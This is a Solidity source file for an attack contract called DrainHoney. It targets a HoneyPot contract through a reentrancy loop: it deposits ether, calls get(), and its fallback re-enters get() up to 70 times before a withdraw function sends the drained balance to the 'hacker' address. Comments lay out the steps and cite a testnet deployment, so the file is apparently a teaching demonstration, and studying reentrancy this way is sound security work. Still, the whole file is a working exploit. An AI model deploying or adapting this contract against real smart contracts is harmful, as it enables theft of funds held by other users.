pragma solidity ^0.4.13;

// Refer to deployed contract at https://ropsten.etherscan.io/address/0x935212B4d15cbF496FdDbFD63821ad4e04d0777d
// Another example of draining contracts

import './HoneyPot.sol';

contract DrainHoney {

  HoneyPot hp;
  uint loop;
  address hacker;

  function DrainHoney(address _contract) {
    hp = HoneyPot(_contract);
    hacker = msg.sender;
  }
  // step 1: send 0.1 first
  function sendMoney() payable {
    hp.put.value(msg.value)();
  }
  // step 2: call get next
  function get() {
    hp.get();
  }

  // step 3: just withdraw everything
  function withdraw() {
    require(msg.sender == hacker);
    msg.sender.transfer(this.balance);
  }

  function() payable {
     if (loop < 70) {
       loop++;
       hp.get();
     }
  }
}
